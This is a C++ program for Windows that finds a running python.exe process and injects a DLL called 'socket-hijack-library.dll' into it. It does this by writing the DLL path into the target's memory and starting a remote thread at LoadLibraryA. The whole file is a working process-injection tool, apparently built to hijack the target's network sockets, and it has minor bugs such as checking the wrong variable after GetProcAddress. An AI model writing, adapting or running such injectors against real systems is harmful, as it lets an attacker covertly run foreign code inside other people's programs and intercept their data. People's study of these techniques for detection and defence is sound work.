#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <psapi.h>

bool MatchProcessIdAndName(DWORD processID, LPWSTR processName)
{
    TCHAR foundProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ, FALSE, processID);

    // Get the process name.
    if (NULL != process)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(process, &hMod, sizeof(hMod), &cbNeeded))
        {
            GetModuleBaseName(process, hMod, foundProcessName,
                sizeof(foundProcessName) / sizeof(TCHAR));
        }
    }

    // Release the handle to the process.
    CloseHandle(process);

    if (wcscmp(foundProcessName, processName) == 0) {
        return true;
    }

    return false;
}

int main()
{
    const char* libraryPath = R"(C:\Users\cmb\Desktop\socket-hijack\x64\Debug\socket-hijack-library.dll)";
    TCHAR targetName[] = TEXT("python.exe");

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }


    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            if (MatchProcessIdAndName(aProcesses[i], targetName)) {
                std::cout << "Found target process! " << aProcesses[i] << " \n";
                break;
            }
        }
    }

    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);

    if (targetProcess == NULL) {
        std::cout << "Could not open process...\n";
        exit(1);
    } 
    else {
        std::cout << "Opened process!\n";
    }

    LPVOID loadLibraryAAddr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    if (targetProcess == NULL) {
        std::cout << "Could not get address of LoadLibraryA...\n";
        exit(1);
    } 
    else {
        std::cout << "Got address of LoadLibraryA!\n";
    }

    LPVOID libraryPathInTarget = (LPVOID)VirtualAllocEx(targetProcess, NULL, strlen(libraryPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (libraryPathInTarget == NULL) {
        std::cout << "Could not create a new memory region inside the target process...\n";
        exit(1);
    } 
    else {
        std::cout << "Created a new memory region within the target process...\n";
    }

    auto bytesWrittenInTarget = WriteProcessMemory(targetProcess, libraryPathInTarget, libraryPath, strlen(libraryPath), NULL);

    if (bytesWrittenInTarget == 0) {
        std::cout << "Could not write the library path in the target process memory...\n";
        exit(1);
    }
    else {
        std::cout << "Wrote the library path in the target process memory!\n";
    }

    HANDLE remoteThreadInTarget = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAAddr, libraryPathInTarget, NULL, NULL);

    if (remoteThreadInTarget == NULL) {
        std::cout << "Could not create a remote thread in the target process...\n";
        exit(1);
    }
    else {
        std::cout << "Created a remote thread in the target process at LoadLibraryA!\n";
    }

    CloseHandle(targetProcess);
}

